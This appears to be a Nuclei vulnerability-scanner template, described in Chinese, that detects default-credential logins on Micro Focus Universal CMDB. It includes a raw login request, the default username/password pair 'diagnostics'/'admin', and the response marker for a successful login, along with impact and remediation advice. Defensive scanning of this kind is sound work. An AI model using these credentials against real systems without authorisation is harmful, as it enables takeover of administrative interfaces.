id: ucmdb-default-login

info:
  name: Micro Focus Universal CMDB 默认口令登录（弱口令）
  author: dwisiswant0
  severity: high
  description: |
    该模板用于检测 Micro Focus Universal CMDB 是否仍可使用默认凭据或弱口令登录。模板主要向 `/ucmdb-ui/cms/loginRequest.do;` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `LWSSO_COOKIE_KEY` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可进入 Micro Focus Universal CMDB 管理界面，查看或修改用户、权限、认证策略、流程或资产配置。
    - 身份、流程或资产管理系统被弱口令接管后，可能造成越权访问、策略绕过、敏感资产信息泄露和更大范围的权限扩散。
  remediation: |
    - 立即修改默认管理员口令，禁用初始化账号，并为高权限账户启用多因素认证。
    - 限制管理入口来源，按最小权限拆分管理员角色，并开启认证、授权和配置变更审计。
    - 复核用户、角色、认证策略、访问令牌和近期登录记录，必要时强制重置相关账号凭据。
  reference:
    - https://packetstormsecurity.com/files/161182/Micro-Focus-UCMDB-Remote-Code-Execution.htm
  classification:
    cwe-id: CWE-798
  metadata:
    max-request: 1
  tags: ucmdb,default-login,packetstorm,vuln

http:
  - raw:
      - |
        POST /ucmdb-ui/cms/loginRequest.do; HTTP/1.1
        Host: {{Hostname}}

        customerID=1&isEncoded=false&userName={{username}}&password={{base64(password)}}&ldapServerName=UCMDB

    attack: pitchfork
    payloads:
      username:
        - diagnostics
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "LWSSO_COOKIE_KEY"
